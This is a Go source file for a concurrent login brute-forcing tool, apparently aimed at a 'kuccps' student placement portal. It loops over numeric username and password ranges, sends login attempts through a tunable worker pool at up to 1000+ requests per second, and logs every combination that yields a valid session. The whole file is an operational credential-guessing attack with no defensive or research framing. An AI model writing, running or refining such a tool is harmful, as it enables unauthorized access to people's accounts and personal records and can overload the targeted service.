package main

import (
	"flag"
	"fmt"
	"github.com/schollz/progressbar/v3"
	"kuccps/functions"
	"log"
	"os"
	"runtime"
	"sync"
	"sync/atomic"
	"time"
)

type Config struct {
	workers         int
	httpTimeout     time.Duration
	dialTimeout     time.Duration
	jobBuffer       int
	connPoolSize    int
	forceHTTP2      bool
	maxConnsPerHost int
	presetName      string
}

func main() {
	slowPreset := flag.Bool("slow", false, "Conservative settings (100-300 req/sec)")
	mediumPreset := flag.Bool("medium", false, "Balanced performance (500-800 req/sec)")
	fastPreset := flag.Bool("fast", false, "High performance (1000+ req/sec)")
	userStart := flag.Int("uS", 0, "Start of username range")
	userEnd := flag.Int("uE", 0, "End of username range")
	passStart := flag.Int("pS", 0, "Start of password range")
	passEnd := flag.Int("pE", 0, "End of password range")
	year := flag.String("y", "2022", "Login year")

	flag.Parse()

	if *userStart == 0 || *userEnd == 0 || *passStart == 0 || *passEnd == 0 {
		log.Fatal("All range parameters are required")
	}

	presetCount := 0
	for _, b := range []bool{*slowPreset, *mediumPreset, *fastPreset} {
		if b {
			presetCount++
		}
	}
	if presetCount > 1 {
		log.Fatal("Cannot use multiple presets simultaneously")
	}

	config := getPresetConfig(*slowPreset, *mediumPreset, *fastPreset)
	log.Printf("Initializing %s preset configuration", config.presetName)
	log.Printf("Workers: %d | HTTP Timeout: %v | Connection Pool: %d",
		config.workers, config.httpTimeout, config.connPoolSize)

	functions.InitializeClient(functions.ClientConfig{
		Timeout:           config.httpTimeout,
		DialTimeout:       config.dialTimeout,
		MaxIdleConns:      config.connPoolSize,
		ForceAttemptHTTP2: config.forceHTTP2,
		MaxConnsPerHost:   config.maxConnsPerHost,
	})

	totalUsers := *userEnd - *userStart + 1
	totalPasswords := *passEnd - *passStart + 1
	totalCombinations := totalUsers * totalPasswords

	var (
		requestCount uint64
		successCount uint64
		startTime    = time.Now()
	)

	// Set up the progress bar
	bar := progressbar.NewOptions(int(totalCombinations),
		progressbar.OptionSetDescription("🔍 Checking"),
		progressbar.OptionShowCount(),
		progressbar.OptionShowIts(),
		progressbar.OptionThrottle(65*time.Millisecond),
		progressbar.OptionSetWidth(40),
		progressbar.OptionClearOnFinish(),
	)

	jobs := make(chan [2]int, config.jobBuffer)
	var wg sync.WaitGroup

	for w := 0; w < config.workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for job := range jobs {
				user, pass := job[0], job[1]
				result := functions.Login(
					fmt.Sprintf("%d", user),
					fmt.Sprintf("%d", pass),
					*year,
				)

				atomic.AddUint64(&requestCount, 1)
				bar.Add(1)

				if result.Status == "valid_session" {
					atomic.AddUint64(&successCount, 1)
					log.Printf("\n✅ SUCCESS: User: %d, Pass: %d", user, pass)
				}
			}
		}()
	}

	// Submit jobs to the workers
	go func() {
		for user := *userStart; user <= *userEnd; user++ {
			for pass := *passStart; pass <= *passEnd; pass++ {
				jobs <- [2]int{user, pass}
			}
		}
		close(jobs)
	}()

	wg.Wait()

	// Final report
	duration := time.Since(startTime)
	fmt.Fprintf(os.Stderr, "\n\n✅ Completed %d requests in %v (%.1f req/sec)\n",
		atomic.LoadUint64(&requestCount),
		duration.Round(time.Second),
		float64(atomic.LoadUint64(&requestCount))/duration.Seconds(),
	)
	fmt.Printf("🎉 Successful logins: %d\n", atomic.LoadUint64(&successCount))
}

func getPresetConfig(slow, medium, fast bool) Config {
	baseWorkers := runtime.NumCPU() * 10
	if baseWorkers > 200 {
		baseWorkers = 200
	}

	base := Config{
		presetName:      "medium",
		workers:         clampWorkers(baseWorkers),
		httpTimeout:     8 * time.Second,
		dialTimeout:     10 * time.Second,
		jobBuffer:       calcJobBuffer(200000),
		connPoolSize:    clampWorkers(baseWorkers * 2),
		forceHTTP2:      false,
		maxConnsPerHost: clampWorkers(baseWorkers * 2),
	}

	switch {
	case slow:
		workers := clampWorkers(runtime.NumCPU() * 2)
		return Config{
			presetName:      "slow",
			workers:         workers,
			httpTimeout:     15 * time.Second,
			dialTimeout:     15 * time.Second,
			jobBuffer:       calcJobBuffer(50000),
			connPoolSize:    workers * 2,
			forceHTTP2:      false,
			maxConnsPerHost: workers * 2,
		}
	case medium:
		return base
	case fast:
		workers := clampWorkers(runtime.NumCPU() * 20)
		return Config{
			presetName:      "fast",
			workers:         workers,
			httpTimeout:     5 * time.Second,
			dialTimeout:     7 * time.Second,
			jobBuffer:       calcJobBuffer(500000),
			connPoolSize:    workers * 2,
			forceHTTP2:      true,
			maxConnsPerHost: workers * 2,
		}
	}
	return base
}

func clampWorkers(n int) int {
	max := 2000
	if runtime.GOOS == "windows" {
		max = 500
	}
	if n < 4 {
		return 4
	}
	if n > max {
		return max
	}
	return n
}

func calcJobBuffer(base int) int {
	if runtime.GOOS == "windows" {
		return base / 2
	}
	return base
}
